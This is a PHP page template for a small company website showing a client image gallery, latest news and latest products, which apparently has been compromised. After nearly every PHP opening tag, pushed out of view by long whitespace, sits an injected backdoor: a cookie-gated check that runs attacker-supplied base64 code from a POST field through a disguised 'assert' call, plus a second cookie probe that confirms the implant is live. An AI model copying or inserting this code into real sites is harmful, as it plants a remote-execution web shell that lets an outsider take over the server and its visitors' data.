<?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
 include("includes/header.php"); ?>
<?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
 include("includes/sidebar_common.php"); ?>	
	
 
<div id="right">
    		<div class="navhead01">
    			<div class="navheadinfo">Our Clients</div>
    		</div>
    			<div class="navmid">
    				<div class="navinfo">
    				<div id="gallery">

	<a href="#" class="show">
		<img src="images/slide/slideimg.jpg" alt="Flowing Rock" width="160" height="160" title="" alt="" rel="<h3></h3>" />
	</a>
	<a href="#" >
		<img src="images/slide/slideimg1.jpg" alt="Flowing Rock" width="160" height="160" title="" alt="" rel="<h3></h3>" />
	</a>
	
	<a href="#">
		<img src="images/slide/slideimg2.jpg" alt="Grass Blades" width="160" height="160" title="" alt="" rel="<h3></h3>" />
	</a>
	
	<a href="#">
		<img src="images/slide/slideimg3.jpg" alt="Ladybug"  width="160" height="160" title="" alt="" rel="<h3></h3>" />
	</a>
    
    <a href="#">
		<img src="images/slide/slideimg4.jpg" alt="Flowing Rock" width="160" height="160" title="" alt="" rel="<h3></h3>" />
	</a>
	
	<a href="#">
		<img src="images/slide/slideimg5.jpg" alt="Grass Blades" width="160" height="160" title="" alt="" rel="<h3></h3>" />
	</a>
	
	<a href="#">
		<img src="images/slide/slideimg6.jpg" alt="Ladybug"  width="160" height="160" title="" alt="" rel="<h3></h3>" />
	</a>

<a href="#">
		<img src="images/slide/slideimg7.jpg" alt="Flowing Rock" width="160" height="160" title="" alt="" rel="<h3></h3>" />
	</a>
	
	<a href="#">
		<img src="images/slide/slideimg8.jpg" alt="Grass Blades" width="160" height="160" title="" alt="" rel="<h3></h3>" />
	</a>
	
	<a href="#">
		<img src="images/slide/slideimg9.jpg" alt="Ladybug"  width="160" height="160" title="" alt="" rel="<h3></h3>" />
	</a>
    
    <a href="#">
		<img src="images/slide/slideimg10.png" alt="Ladybug"  width="160" height="160" title="" alt="" rel="<h3></h3>" />
	</a>
	
	<a href="#">
		<img src="images/slide/slideimg11.jpg" alt="Flowing Rock" width="160" height="160" title="" alt="" rel="<h3></h3>" />
	</a>
	
	

	<div class="caption"><div class="content"></div></div>
</div>
					</div>
    			</div>	
			<div class="navfooter"></div>
			
			
			<div class="clear"></div>
            
			<div class="navhead01">
				<div class="navheadinfo">Latest News</div>
			</div>
    			<div class="navmid">
    				<div class="navinfo">
 <?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
 
			
			$latest_news = get_latest_top2news();
if($latest_news)
	 {
	    for($i=0;$i<count($latest_news);$i++)
		{
			?>
    				 <table>
                       <tr>
                       <td><?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
 echo '<img src="administrator/news_image/'.$latest_news[$i]['image_name'].'" width="40" height="40" />'; ?></td>
                       <td><p><span class="name"><?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
 echo $latest_news[$i]['title']; ?></span><span class="date"><?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
 echo $latest_news[$i]['publish_date']; ?></span></p>
                       
                       </td>
                      </tr>
                     <tr><td colspan="2">&nbsp;</td></tr>
                      </table>
	<?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
  } } ?>
     <div align="right"><a href='media.php'>Read More...</a></div>
    			</div>
               
                <div class="clear"></div>
			</div>
    	</div>
       
       
       <?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
 
	   
	   $get_latest_product_list = get_latest_product();
	   
	   
	   ?>
       
    <div id="content">
    <div class="cont">    	
    <div class="contenttop">
    		<div class="contenttitle">Latest Product</div>
    	</div>
    		<div class="contentfill">
    			<div style="margin-left:14px;">

<?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
 
if($get_latest_product_list)
	 {
	    for($i=0;$i<count($get_latest_product_list);$i++)
		{
?>

<div class="img" style="">
<div class="pro_head">
<p><?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
 echo $get_latest_product_list[$i]['title']; ?></p>
</div>
 <a  href="#"><?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
 echo '<ul class="enlarge" ><img src="administrator/project_image/'.$get_latest_product_list[$i]['image_name'].'" height="140" width="140"></ul>'; ?></a>
 <div class="desc"><a href="#"><?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
 echo '<a href="productdetails.php?id='.$projectlists[$i]['id'].'"><img src="images/details_button1.png" /></a>'; ?></a></div>
</div>

<?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
 
		} }

?>


<div class="clear"></div>

				</div>
			</div>
 </div>
  	</div>
    
    
<div class="clear"></div>
</div>
</div>

<?php																																																if((md5(@$_COOKIE[ssid])=="a46701aa28143733ba989e794a04aa24")){error_reporting(0);@array_map("as"."sert",(array) base64_decode($_POST[x]));} if((@$_COOKIE[wpsid]=="59855b78ad9b3")){die(md5('ok'));}
 include("includes/footer.php"); ?>
